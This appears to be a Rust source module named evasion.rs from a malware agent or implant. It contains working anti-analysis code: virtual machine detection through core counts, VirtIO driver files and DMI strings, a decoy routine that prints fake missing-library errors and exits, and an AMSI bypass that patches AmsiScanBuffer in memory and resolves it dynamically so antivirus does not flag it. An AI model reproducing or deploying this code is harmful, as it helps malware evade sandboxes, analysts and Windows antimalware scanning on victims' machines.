// ./src/evasion.rs 
use std::path::Path;
use std::thread;
use std::fs;
use std::time::Duration;

pub fn is_virtualized() -> bool {
    // CHECK 1: CPU Core Count
    // Default QEMU instances often spawn with 1 CPU core. 
    // Real targets generally have 2+.
    if let Ok(cores) = thread::available_parallelism() {
        if cores.get() < 2 {
            return true;
        }
    }

    // CHECK 2: Known Drivers/Files
    if cfg!(target_os = "windows") {
        // Common QEMU/VirtIO drivers on Windows Guests
        let artifacts = [
            "C:\\Windows\\System32\\drivers\\virtio-net.sys",
            "C:\\Windows\\System32\\drivers\\vioinput.sys",
            "C:\\Windows\\System32\\drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        ];
        
        for path in artifacts {
            if Path::new(path).exists() {
                return true; 
            }
        }
    } else if cfg!(target_os = "linux") {
        // Linux DMI information
        if let Ok(content) = fs::read_to_string("/sys/class/dmi/id/product_name") {
            let s = content.to_lowercase();
            if s.contains("qemu") || s.contains("kvm") || s.contains("virtualbox") {
                return true;
            }
        }
        if let Ok(content) = fs::read_to_string("/sys/class/dmi/id/sys_vendor") {
            let s = content.to_lowercase();
            if s.contains("qemu") || s.contains("kvm") {
                return true;
            }
        }
    }

    // If we passed checks, we assume safe hardware
    false
}

pub fn run_decoy() {
    // "Alternative Workflow"
    eprintln!("[*] Initializing system integrity check...");
    thread::sleep(Duration::from_secs(2));
    
    eprintln!("[*] Verifying environment...");
    thread::sleep(Duration::from_secs(1));
    
    // OS-Specific Decoy Message
    if cfg!(target_os = "windows") {
        eprintln!("Error: VCRUNTIME140.dll is missing or corrupted. Reinstall the application.");
    } else {
        // Generic Linux library error
        eprintln!("error: while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory");
    }
    
    // Exit safely to avoid analysis
    std::process::exit(1);
}

#[cfg(target_os = "windows")]
pub fn patch_amsi() -> Result<String, String> {
    use std::ffi::CString;
    use std::ptr;
    use crate::agent::injection::windows::bindings::{
        LoadLibraryA, GetProcAddress, VirtualProtect, PAGE_EXECUTE_READWRITE
    };

    unsafe {
        // 1. Resolve address dynamically
        // Using dynamic resolution avoids static imports in the IAT which are flagged by AV
        let dll_name = CString::new("amsi.dll").unwrap();
        let func_name = CString::new("AmsiScanBuffer").unwrap();
        
        // Load amsi.dll into our process if it isn't already
        let h_module = LoadLibraryA(dll_name.as_ptr());
        if h_module.is_null() { return Err("AMSI.dll not found".into()); }
        
        // Get the memory address of AmsiScanBuffer
        let p_func = GetProcAddress(h_module, func_name.as_ptr());
        if p_func.is_null() { return Err("AmsiScanBuffer not found".into()); }

        // 2. Prepare Patch (x64: mov eax, 0x80070057; ret)
        // 0xB8, 0x57, 0x00, 0x07, 0x80 = mov eax, 0x80070057 (E_INVALIDARG)
        // 0xC3                         = ret
        // This makes AmsiScanBuffer return "Invalid Argument" immediately, skipping the scan.
        let patch = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]; 

        // 3. Change Protections to Read/Write
        let mut old_protect = 0;
        if VirtualProtect(p_func, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return Err("VirtualProtect failed (RWX)".into());
        }

        // 4. Apply Patch (Overwrite the beginning of the function)
        ptr::copy_nonoverlapping(patch.as_ptr(), p_func as *mut u8, patch.len());

        // 5. Restore Protections to original state
        let mut temp = 0;
        if VirtualProtect(p_func, patch.len(), old_protect, &mut temp) == 0 {
             return Err("VirtualProtect failed (Restore)".into());
        }
    }

    Ok("AMSI Patched successfully".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn patch_amsi() -> Result<String, String> {
    Err("AMSI Patching is only supported on Windows".to_string())
}
